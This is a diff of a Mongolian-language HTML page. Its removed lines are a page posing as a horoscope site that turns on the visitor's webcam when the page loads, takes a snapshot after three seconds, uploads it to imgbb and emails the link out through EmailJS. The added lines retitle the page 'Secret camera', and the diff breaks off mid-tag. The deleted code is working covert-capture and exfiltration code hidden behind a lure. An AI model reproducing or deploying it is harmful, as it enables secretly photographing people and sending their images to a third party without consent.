@@ -2,80 +2,8 @@
 <html lang="mn">
 <head>
   <meta charset="UTF-8">
-  <title>Klbnova_k - Зурхай</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      margin-top: 50px;
-    }
-    video {
-      display: none;
-    }
-  </style>
+  <title>Нууц камер</title>
 </head>
 <body>
-  <h2>🔥 Танай зурхай гарч байна! Камераа идэвхжүүлж байна...</h2>
-  <video id="video" autoplay playsinline></video>
-
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-  <script>
-    // EmailJS инициализаци
-    emailjs.init('kipfas-5Vanci-myzpec'); // <-- ЭНД өөрийн PUBLIC KEY-г оруулсан байна
-
-    // Хуудас ачаалахад автоматаар эхэлнэ
-    window.onload = async function start() {
-      const video = document.getElementById('video');
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        video.style.display = 'block';
-
-        // 3 секунд хүлээгээд зураг авна
-        setTimeout(() => {
-          takeSnapshot(video);
-          stream.getTracks().forEach(track => track.stop());
-          video.style.display = 'none';
-        }, 3000);
-      } catch (err) {
-        console.error("Камер идэвхжүүлэхэд алдаа гарлаа:", err);
-        alert("Камерт хандах боломжгүй байна. Та зөвшөөрөл өгнө үү.");
-      }
-    }
-
-    function takeSnapshot(video) {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      const imageData = canvas.toDataURL('image/jpeg');
-      uploadAndSend(imageData);
-    }
-
-    function uploadAndSend(base64Image) {
-      const formData = new FormData();
-      formData.append('image', base64Image);
-
-      fetch('https://api.imgbb.com/1/upload?key=YOUR_IMGBB_API_KEY', { // <-- ЭНД API KEY-ээ оруулна
-        method: 'POST',
-        body: formData
-      })
-      .then(res => res.json())
-      .then(data => {
-        const image_url = data.data.url;
-        return emailjs.send('service_i42qtc9', 'template_6zilr7d', {
-          image_url: image_url
-        });
-      })
-      .then(() => {
-        alert("Зураг амжилттай илгээгдлээ!");
-      })
-      .catch(err => {
-        console.error("Зураг илгээхэд алдаа гарлаа:", err);
-        alert("Алдаа гарлаа!");
-      });
-    }
-  </script>
-</body>
-</html>
+  <h2>Зураг илгээх туршилт</h2>
+  <video id="
